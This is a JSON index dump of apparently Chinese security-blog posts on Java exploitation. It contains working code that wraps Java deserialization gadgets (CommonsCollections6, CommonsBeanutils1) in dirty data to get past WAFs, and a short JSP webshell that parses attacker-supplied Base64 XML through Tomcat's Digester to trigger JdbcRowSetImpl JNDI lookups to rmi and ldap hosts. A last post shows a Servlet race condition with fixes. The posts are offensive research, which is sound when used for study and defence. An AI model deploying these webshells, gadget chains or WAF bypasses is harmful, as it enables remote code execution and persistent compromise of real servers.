&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"C3P0","slug":"C3P0","permalink":"https://y4tacker.github.io/tags/C3P0/"}]},{"title":"对Java反序列化数据绕WAF新姿势的补充","slug":"year/2022/2/对Java反序列化数据绕WAF新姿势的补充","date":"2022-02-05T08:26:28.000Z","updated":"2024-08-04T09:01:49.176Z","comments":true,"path":"2022/02/05/year/2022/2/对Java反序列化数据绕WAF新姿势的补充/","link":"","permalink":"https://y4tacker.github.io/2022/02/05/year/2022/2/%E5%AF%B9Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%95WAF%E6%96%B0%E5%A7%BF%E5%8A%BF%E7%9A%84%E8%A1%A5%E5%85%85/","excerpt":"","text":"对Java反序列化脏数据绕WAF新姿势的补充引言相信大家都看过回忆飘如雪大师傅的一篇文章，Java反序列化数据绕WAF之加大量脏数据，在这篇文章当中大师傅提出了通过将gadget加入到集合类型从而可以实现添加脏数据，这里我发现了一个新姿势 灵感也是来源于回忆飘如雪大师傅的另一篇文章的一个一笔带过的问题上 这原本是大师傅想来搞gadget探测的方案，但是却失败了，但本着专研的工匠精神，我对这个问题进行了深入的研究，这里顺便对这个问题解读 为什么这里第一个属性反序列化失败，仍然触发了URLDNS的整个过程顺便这里多提一嘴，为什么之后大师傅提出的直接将URLDNS中的HashMap的键值对中将key或者value任意替换一个为需要探测的class就可以呢，其实核心原因在于是否能触发之后的hash()函数！ 这里我们调重点来讲，好了我们来看看当产生ClassNotFoundException后，最终在java.io.ObjectInputStream#readSerialData,在抛出异常之后他会去继续调用skipCustomData 这里有个if判断，大概是判断当前是否还在块数据当中，如果是跳到下一个块数据当中，每个块分隔是通过0x78这个字节，因为这个字节是一个块的结尾 接下来是一个switch循环，通过下一字节来判断，这里如果都不是则会直接对下一段进行反序列化！！！很神奇吧 因此现在我们就能解释为什么当初对于，这一段代码我们能够成功触发URLDNS的反序列化过程呢，没错就是上面这张图，他直接对下一个块数据继续执行反序列化因此对HashMap的反序列化最终导致URLDNS完整触发 123List&lt;Object&gt; a = new LinkedList&lt;Object&gt;();a.add(makeClass(&quot;TargetClass&quot;));a.add(new URLDNS.getObject(&quot;http://test.dnslog.cn&quot;)); 那么为什么这样却能实现需求呢 123HashMap ht = new HashMap();URL u = new URL(null, url, handler); ht.put(u,我是要探测的gadget); 在这里当调用了K key = (K) s.readObject();由于类不存在抛出异常，之后继续对下一块数据进行反序列化，最终抛出异常后也不可能继续调用下面的value = s.readObjet()了，更别谈通过hash函数最终触发URLDNS，因此最终能够成功 灵感大发既然在抛出ClassNotFoundException后他还会去继续反序列化下一块数据，并且这是个相当于while True的东西🤪！！ 那么我们是不是就可以这样疯狂套娃实现垃圾数据呢？说干就干，当然大家别忘了引入javassist的依赖 简简单单对CommonsBeanutils1来发测试 12345678910111213141516171819202122232425public class Test &#123; public static Class makeClass(String clazzName) throws Exception&#123; ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(clazzName); Class clazz = ctClass.toClass(); ctClass.defrost(); return clazz; &#125; public static void main(String[] args) throws Exception&#123; PriorityQueue priorityQueue = CB1.getObject(); LinkedList linkedList = new LinkedList(); StringBuilder sb = new StringBuilder(); for(int i=0;i&lt;100;i++)&#123; sb.append(&quot;e&quot;); linkedList.add(makeClass(&quot;woshijiad&quot;+sb)); &#125; linkedList.add(priorityQueue); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(linkedList); oos.close(); System.out.println(Base64.encode(barr.toByteArray())); &#125;&#125; 当然这里还有一个小坑就是 大家不要直接像这样，之前makeClass是返回的Class默认是继承序列化借口的，这样就导致虽然也能弹出计算器，但只是因为linkedList对里面的元素循环遍历执行readObject的结果，而不是本篇提出的通过在ClassNotFoundException利用skipCustomData后读取下一块数据执行反序列化利用的过程 123456789101112131415PriorityQueue priorityQueue = CB1.getObject();LinkedList linkedList = new LinkedList();StringBuilder sb = new StringBuilder();for(int i=0;i&lt;100;i++)&#123;sb.append(&quot;e&quot;);linkedList.add(makeClass(&quot;woshijiad&quot;+sb));&#125;linkedList.add(priorityQueue);ByteArrayOutputStream barr = new ByteArrayOutputStream();ObjectOutputStream oos = new ObjectOutputStream(barr);oos.writeObject(linkedList);oos.close();//不要同时运行ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));ois.readObject();","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Waf","slug":"Waf","permalink":"https://y4tacker.github.io/tags/Waf/"}]},{"title":"Java反序列化脏数据绕WAF","slug":"year/2022/2/Java反序列化脏数据绕WAF","date":"2022-02-05T01:46:10.000Z","updated":"2024-08-04T09:01:49.093Z","comments":true,"path":"2022/02/05/year/2022/2/Java反序列化脏数据绕WAF/","link":"","permalink":"https://y4tacker.github.io/2022/02/05/year/2022/2/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%84%8F%E6%95%B0%E6%8D%AE%E7%BB%95WAF/","excerpt":"","text":"Java反序列化脏数据绕WAF平时我们遇到站点的时候偶尔能看到通过大量脏数据绕过waf，当然在java反序列化也可以，实现思路是需要找到一个class可以序列化，它可以把脏数据对象和gadget一起包裹起来，所以我们要找的class，第一需要实现java.io.Serializable接口，第二可以存储任意对象，我的第一想法是HashMap因为之前也考虑过，毕竟HashMap在取出key和value的时候，都会对对象进行反序列化 如下： 1234567HashMap&lt;String, Object&gt; stringObjectHashMap = new HashMap&lt;String, Object&gt;();StringBuilder sb=new StringBuilder(); for(int i=0; i &lt; 10000; i++) &#123; sb.append(&quot;a&quot;); &#125;stringObjectHashMap.put(String.valueOf(sb),queue);ByteArrayOutputStream barr = new ByteArrayOutputStream();ObjectOutputStream oos = new ObjectOutputStream(barr);oos.writeObject(stringObjectHashMap);oos.close(); 当然后面看到了别人的文章，才发现自己还是考虑的比较少，其实集合类型就很容易符合 123456ArrayListLinkedListHashMapLinkedHashMapTreeMap…… 并且最重要的是还能不断套娃，这里直接搬运网上代码写的很好了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677public class DirtyDataWrapper &#123; private int dirtyDataSize; //脏数据大小 private String dirtyData; //脏数据内容 private Object gadget; // ysoserila gadget对象 public DirtyDataWrapper(Object gadget, int dirtyDataSize)&#123; this.gadget = gadget; this.dirtyDataSize = dirtyDataSize; &#125; /** * 将脏数据和gadget对象存到集合对象中 * @return 一个包裹脏数据和gadget对象可序列化对象 */ public Object doWrap()&#123; Object wrapper = null; dirtyData = getLongString(dirtyDataSize); int type = (int)(Math.random() * 10) % 10 + 1; switch (type)&#123; case 0: List&lt;Object&gt; arrayList = new ArrayList&lt;Object&gt;(); arrayList.add(dirtyData); arrayList.add(gadget); wrapper = arrayList; break; case 1: List&lt;Object&gt; linkedList = new LinkedList&lt;Object&gt;(); linkedList.add(dirtyData); linkedList.add(gadget); wrapper = linkedList; break; case 2: HashMap&lt;String,Object&gt; map = new HashMap&lt;String, Object&gt;(); map.put(&quot;a&quot;,dirtyData); map.put(&quot;b&quot;,gadget); wrapper = map; break; case 3: LinkedHashMap&lt;String,Object&gt; linkedHashMap = new LinkedHashMap&lt;String,Object&gt;(); linkedHashMap.put(&quot;a&quot;,dirtyData); linkedHashMap.put(&quot;b&quot;,gadget); wrapper = linkedHashMap; break; default: case 4: TreeMap&lt;String,Object&gt; treeMap = new TreeMap&lt;String, Object&gt;(); treeMap.put(&quot;a&quot;,dirtyData); treeMap.put(&quot;b&quot;,gadget); wrapper = treeMap; break; &#125; return wrapper; &#125; /** * 生产随机字符串 * @param length 随机字符串长度 * @return 随机字符串 */ public static String getLongString(int length)&#123; String str = &quot;&quot;; for (int i=0;i&lt;length;i++)&#123; str += &quot;x&quot;; &#125; return str; &#125; // 测试 public static void main(String[] args) throws Exception&#123; Object cc6 = new CommonsCollections6().getObject(&quot;raw_cmd:nslookup xxx.dnslog.cn&quot;); DirtyDataWrapper dirtyDataFactory = new DirtyDataWrapper(cc6,100); ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;/tmp/cc6.ser&quot;)); objectOutputStream.writeObject(dirtyDataFactory.doWrap()); objectOutputStream.flush(); objectOutputStream.close(); &#125;&#125; 当然其实不是所有的集合类都适合用于包裹脏数据和gadget，比如LinkedHashSet,HashSet，TreeSet等类就不适合，至于是为什么呢其实道理很简单，这些数据结构都是有序的，这样就会导致一个问题，如果刚好gadget被排列在前面，可能对于waf来说就可能因此检测到我们的一些恶意数据了 参考文章Java反序列化数据绕WAF之加大量脏数据 | 回忆飘如雪 (gv7.me)","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Waf","slug":"Waf","permalink":"https://y4tacker.github.io/tags/Waf/"}]},{"title":"jsp新webshell的探索之旅","slug":"year/2022/2/jsp新webshell的探索之旅","date":"2022-02-03T09:53:08.000Z","updated":"2024-08-04T09:01:49.165Z","comments":true,"path":"2022/02/03/year/2022/2/jsp新webshell的探索之旅/","link":"","permalink":"https://y4tacker.github.io/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/","excerpt":"","text":"jsp新webshell的探索之旅简介这篇文章记录了我从一个小发现到实现RCE，为了实现更短的webshell，在这之间遇到了一些的新问题到解决，再到最终精简得到一个新的jsp五行Payload构成的webshell的过程 发现在tomcat的扫描中都有对一些配置文件的扫描以及对里面的属性解析赋值的过程，由于之前的一些小发现(这里不多说)，今天下午一个突如其来的crush在我心中出现，我去跟踪了一下解析context.xml的过程 在org.apache.catalina.startup.ContextConfig#contextConfig中，从这里可以看到defaultContextXml要么从标准上下文，要么则是默认值conf/context.xml 接下来在解析阶段，在其中的org.apache.tomcat.util.digester.Digester#startElement引起了我的注意 这里如果匹配到标签Context或Manager则会去调用org.apache.tomcat.util.digester.SetPropertiesRule#begin,而这个函数中取出属性赋值的地方如下 之后通过调用setProperty方法，去调用属性的set方法，具体如下(部分截图) 到了这里一个思路就涌现在我脑中，还记得fastJson的第一个payload吗 12345&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://vps/TouchFile&quot;, &quot;autoCommit&quot;:true&#125; 这不就是都是set的过程 之后我在contenx.xml中加上 123&lt;Manager className=&quot;com.sun.rowset.JdbcRowSetImpl&quot; dataSourceName=&quot;rmi://127.0.0.1/Exploit&quot; autoCommit=&quot;true&quot;&gt;&lt;/Manager&gt; 再次启动tomcat，成功弹出了计算器 新的问题可是这个利用链过程是在tomcat启动的过程啊，要想彻底解决我们还得去看看它是通过什么函数进行解析，以及我们是否能控制呢 在org.apache.catalina.startup.ContextConfig#init中，我们看看关键的步骤 12345678 protected void init() &#123; Digester contextDigester = createContextDigester(); contextDigester.getParser();---------------- contextConfig(contextDigester); &#125; 可以看到函数contextConfig中传入一个contextDigester对象，这个对象我们也很好得到，虽然这是一个protected修饰的函数，但是里面的过程却都是public修饰的，因此我们直接复制出来即可 继续跟进执行在org.apache.catalina.startup.ContextConfig#contextConfig，最开始我们便提到了要么从标准上下文，要么则是默认值conf/context.xml，那么为了扩展攻击面利用我们肯定选择前者 流程实现构造Webshell因此，我们再梳理一下上面的利用流程 1.实例化ContextConfig 2.获取StandardContext，添加到ContextConfig的context 3.初始化Digester对象 4.调用ContextConfig的contextConfig函数执行利用过程 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;%@ page import=&quot;org.apache.catalina.startup.ContextConfig&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.digester.Digester&quot; %&gt;&lt;%@ page import=&quot;java.util.List&quot; %&gt;&lt;%@ page import=&quot;java.util.HashMap&quot; %&gt;&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.digester.RuleSet&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.startup.ContextRuleSet&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.startup.NamingRuleSet&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;% ContextConfig ctConfig = new ContextConfig(); //获取StandardContext Field reqF = request.getClass().getDeclaredField(&quot;request&quot;); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext stcontext = (StandardContext) req.getContext(); stcontext.setDefaultContextXml(&quot;/tmp/context.xml&quot;); Field context = ContextConfig.class.getDeclaredField(&quot;context&quot;); context.setAccessible(true); context.set(ctConfig,stcontext); //实例化Digester对象 Digester digester = new Digester(); digester.setValidating(false); digester.setRulesValidation(true); HashMap&lt;Class&lt;?&gt;, List&lt;String&gt;&gt; fakeAttributes = new HashMap&lt;&gt;(); ArrayList&lt;String&gt; attrs = new ArrayList&lt;&gt;(); attrs.add(&quot;className&quot;); fakeAttributes.put(Object.class, attrs); digester.setFakeAttributes(fakeAttributes); RuleSet contextRuleSet = new ContextRuleSet(&quot;&quot;, false); digester.addRuleSet(contextRuleSet); RuleSet namingRuleSet = new NamingRuleSet(&quot;Context/&quot;); digester.addRuleSet(namingRuleSet); digester.getParser(); //调用contextConfig函数执行利用过程 Method contextConfig = ContextConfig.class.getDeclaredMethod(&quot;contextConfig&quot;, Digester.class); contextConfig.setAccessible(true); contextConfig.invoke(ctConfig,digester);%&gt; 在浏览器直接访问，成功弹出 深入思考难道这就够了吗，看着这串又臭又长的webshell我一点都不满足，我想让这个webshell更短一点，那么为了实现这一步那就得跟深入的对利用流程进行跟踪 我们可以发现在org.apache.catalina.startup.ContextConfig#contextConfig，在调用processContextConfig的时候 可以看到在实际上主要的步骤还是在对Digester对象继续的添加加载器等操作以及最终调用parse函数，在其中唯一多出来的部分就是这个InputSource 那么去掉一些无关的操作最终得到，当然这部分就是自己寻找的过程就没必要写进来了 1234567&lt;% org.apache.tomcat.util.digester.Digester digester = new org.apache.tomcat.util.digester.Digester(); digester.addRuleSet(new org.apache.catalina.startup.ContextRuleSet(&quot;&quot;, false)); org.xml.sax.InputSource inputSource = new org.xml.sax.InputSource(); inputSource.setByteStream(new java.io.ByteArrayInputStream(java.util.Base64.getDecoder().decode(request.getParameter(&quot;cmd&quot;)))); digester.parse(inputSource);%&gt; 测试执行成功 其中cmd解码内容为 12345678&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;&lt;Context&gt; &lt;Manager className=&quot;com.sun.rowset.JdbcRowSetImpl&quot; dataSourceName=&quot;rmi://127.0.0.1/Exploit&quot; autoCommit=&quot;true&quot;&gt;&lt;/Manager&gt;&lt;/Context&gt; 当然还有个关键的就是不要忘了启动一个恶意jndi服务","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Tomcat","slug":"Tomcat","permalink":"https://y4tacker.github.io/tags/Tomcat/"},{"name":"Jsp","slug":"Jsp","permalink":"https://y4tacker.github.io/tags/Jsp/"}]},{"title":"Servlet的线程安全问题","slug":"year/2022/2/Servlet的线程安全问题","date":"2022-02-03T02:02:18.000Z","updated":"2024-08-04T09:01:49.112Z","comments":true,"path":"2022/02/03/year/2022/2/Servlet的线程安全问题/","link":"","permalink":"https://y4tacker.github.io/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/","excerpt":"","text":"Servlet的线程安全问题引入首先看看这样的代码，有什么问题 这里既要求cmd不能包含Calculator又必须要包含Calculator，能做到吗，当然是可以的 Servlet的多线程机制Servlet实际上是一个单件，当我们第一次请求某个Servlet时，Servlet容器将会根据web.xml配置文件或者是注解实例化这个Servlet类，之后如果又有新的客户端请求该Servlet时，则一般不会再实例化该Servlet类，这说明了什么呢？简单来说，当多个用户一起访问时，得到的其实是同一个Servlet实例，这样的话，他们对实例的成员变量的修改其实会影响到别人，所以在开发的时候如果没有注意这个问题往往会有一些额安全问题，而往往Servlet的线程安全问题主要是由于实例变量使用不当而引起 因此我们再看上面的代码，很明显我们看到了这个status状态变量是实例变量，当然这里为了突出并发的效果，这里加了一个延时，这里简简单单用python实现竞争，也不必上多线程了简单点 123456url = &quot;http://127.0.0.1:8080/?cmd=open -na Calculator&quot;while 1: r = requests.get(url) if &quot;Cal&quot; in r.text: print(r.text) 1234url = &quot;http://127.0.0.1:8080/?cmd=ls&quot;while 1: r = requests.get(url) 如何修复1.实现 SingleThreadModel 接口该接口指定了系统如何处理对同一个Servlet的调用。如果一个Servlet被这个接口指定，那么在这个Servlet中的service方法将不会有两个线程被同时执行，当然也就不存在线程安全的问题。这种方法只要继承这个接口就行了,因此将我们上面的代码改为 1public class TestServlet extends HttpServlet implements SingleThreadModel 这样你觉得就完全安全了吗？？答案也不是，如果我们将上面的对状态的定义加上static呢 1public static boolean status; lol，还是可以成功，原因是SingleThreadModel不会解决所有的线程安全隐患。会话属性和静态变量仍然可以被多线程的多请求同时访问 还有一点很重要该接口在Servlet API 2.4中将不推荐使用。 2.避免使用成员变量既然问题出自成员变量，那么我们就尽量避免去使用它 将上面的代码改为 12345678910111213141516171819202122232425public class TestServlet extends HttpServlet&#123;// public boolean status; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; boolean status = true; String cmd = req.getParameter(&quot;cmd&quot;); if (cmd.contains(&quot;Calculator&quot;)) &#123; status = false; try &#123; Thread.sleep(1000); &#125;catch (Exception e)&#123; &#125; &#125; if (!status) &#123; return; &#125; if (cmd.contains(&quot;Calculator&quot;))&#123; resp.getWriter().write(cmd); &#125; &#125;&#125; 3.同步对共享数据的操作使用synchronized 关键字能保证一次只有一个线程可以访问被保护的区段，因此可以将代码写为 1234567891011121314151617181920212223242526272829public class TestServlet extends HttpServlet&#123; public boolean status; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; String cmd = req.getParameter(&quot;cmd&quot;); boolean status; synchronized(this) &#123; status = true; if (cmd.contains(&quot;Calculator&quot;)) &#123; status = false; try &#123; Thread.sleep(5000); &#125; catch (Exception e) &#123; &#125; &#125; &#125; if (!status) &#123; return; &#125; if (cmd.contains(&quot;Calculator&quot;))&#123; resp.getWriter().write(cmd); &#125; &#125;&#125; 思考与小结但是如果利用上面三种方式去修复，这样就完全没问题了吗？并不是 比如实现SingleThreadModel以及在程序中使用同步来保护要使用的共享的数据，在实际业务当中这也会使得我们系统的性能大大下降，这也是我们不太希望看到的，前者为每个新的请求创建一个单独的Servlet实例，这将引起大量的系统开销，而后者被同步的代码块在同一时刻也只能有一个线程执行它，这也会导致在高并发的情况下，同时处理请求的吞吐量显著的降低 因此，在Serlet中避免使用实例变量或许是更好的选择，但如果无法避免，但如果无法避免，也应该尽量做到去同步可用性最小的代码路径 参考文章https://www.cnblogs.com/chanshuyi/p/5052426.html https://zhuanlan.zhihu.com/p/93708538 https://www.jianshu.com/p/06260e0667a9","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Tomcat","slug":"Tomcat","permalink":"https://y4tacker.github.io/tags/Tomcat/"}]}],"categories":[{"name":"随笔","slug":"随笔","permalink":"https://y4tacker.github.io/categories/%E9%9A%8F%E7%AC%94/"},{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"},{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/categories/PHP/"},{"name":"Python","slug":"Python","permalink":"https://y4tacker.github.io/categories/Python/"},{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/categories/CTF/"},{"name":"php","slug":"php","permalink":"https://y4tacker.github.io/categories/php/"},{"name":"PTES","slug":"PTES","permalink":"https://y4tacker.github.io/categories/PTES/"},{"name":"总结","slug":"总结","permalink":"https://y4tacker.github.io/categories/%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://y4tacker.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"GeoServer","slug":"GeoServer","permalink":"https://y4tacker.github.io/tags/GeoServer/"},{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/tags/PHP/"},{"name":"ShowDoc","slug":"ShowDoc","permalink":"https://y4tacker.github.io/tags/ShowDoc/"},{"name":"通天星","slug":"通天星","permalink":"https://y4tacker.github.io/tags/%E9%80%9A%E5%A4%A9%E6%98%9F/"},{"name":"H3C","slug":"H3C","permalink":"https://y4tacker.github.io/tags/H3C/"},{"name":"CrushFTP","slug":"CrushFTP","permalink":"https://y4tacker.github.io/tags/CrushFTP/"},{"name":"Smartbi","slug":"Smartbi","permalink":"https://y4tacker.github.io/tags/Smartbi/"},{"name":"Jenkis","slug":"Jenkis","permalink":"https://y4tacker.github.io/tags/Jenkis/"},{"name":"Python","slug":"Python","permalink":"https://y4tacker.github.io/tags/Python/"},{"name":"Gitlab","slug":"Gitlab","permalink":"https://y4tacker.github.io/tags/Gitlab/"},{"name":"Trick","slug":"Trick","permalink":"https://y4tacker.github.io/tags/Trick/"},{"name":"代码审计","slug":"代码审计","permalink":"https://y4tacker.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"Apache","slug":"Apache","permalink":"https://y4tacker.github.io/tags/Apache/"},{"name":"Apusic","slug":"Apusic","permalink":"https://y4tacker.github.io/tags/Apusic/"},{"name":"IDEA","slug":"IDEA","permalink":"https://y4tacker.github.io/tags/IDEA/"},{"name":"FernFlower","slug":"FernFlower","permalink":"https://y4tacker.github.io/tags/FernFlower/"},{"name":"Struts2","slug":"Struts2","permalink":"https://y4tacker.github.io/tags/Struts2/"},{"name":"Fastjson","slug":"Fastjson","permalink":"https://y4tacker.github.io/tags/Fastjson/"},{"name":"TemplatesImpl","slug":"TemplatesImpl","permalink":"https://y4tacker.github.io/tags/TemplatesImpl/"},{"name":"踩坑记录","slug":"踩坑记录","permalink":"https://y4tacker.github.io/tags/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"},{"name":"Go","slug":"Go","permalink":"https://y4tacker.github.io/tags/Go/"},{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/tags/CTF/"},{"name":"Nodejs","slug":"Nodejs","permalink":"https://y4tacker.github.io/tags/Nodejs/"},{"name":"Webshell","slug":"Webshell","permalink":"https://y4tacker.github.io/tags/Webshell/"},{"name":"Apache Commons Text","slug":"Apache-Commons-Text","permalink":"https://y4tacker.github.io/tags/Apache-Commons-Text/"},{"name":"Apache Commons Jxpath","slug":"Apache-Commons-Jxpath","permalink":"https://y4tacker.github.io/tags/Apache-Commons-Jxpath/"},{"name":"Log4j2","slug":"Log4j2","permalink":"https://y4tacker.github.io/tags/Log4j2/"},{"name":"Waf","slug":"Waf","permalink":"https://y4tacker.github.io/tags/Waf/"},{"name":"pearcmd","slug":"pearcmd","permalink":"https://y4tacker.github.io/tags/pearcmd/"},{"name":"PTES","slug":"PTES","permalink":"https://y4tacker.github.io/tags/PTES/"},{"name":"Rasp","slug":"Rasp","permalink":"https://y4tacker.github.io/tags/Rasp/"},{"name":"Jsp","slug":"Jsp","permalink":"https://y4tacker.github.io/tags/Jsp/"},{"name":"自动化","slug":"自动化","permalink":"https://y4tacker.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"总结","slug":"总结","permalink":"https://y4tacker.github.io/tags/%E6%80%BB%E7%BB%93/"},{"name":"Kryo","slug":"Kryo","permalink":"https://y4tacker.github.io/tags/Kryo/"},{"name":"Serialkiller","slug":"Serialkiller","permalink":"https://y4tacker.github.io/tags/Serialkiller/"},{"name":"Shiro","slug":"Shiro","permalink":"https://y4tacker.github.io/tags/Shiro/"},{"name":"Enjoy模板","slug":"Enjoy模板","permalink":"https://y4tacker.github.io/tags/Enjoy%E6%A8%A1%E6%9D%BF/"},{"name":"反序列化","slug":"反序列化","permalink":"https://y4tacker.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"XStream","slug":"XStream","permalink":"https://y4tacker.github.io/tags/XStream/"},{"name":"SnakeYAML","slug":"SnakeYAML","permalink":"https://y4tacker.github.io/tags/SnakeYAML/"},{"name":"SpEL","slug":"SpEL","permalink":"https://y4tacker.github.io/tags/SpEL/"},{"name":"C3P0","slug":"C3P0","permalink":"https://y4tacker.github.io/tags/C3P0/"},{"name":"Tomcat","slug":"Tomcat","permalink":"https://y4tacker.github.io/tags/Tomcat/"}]}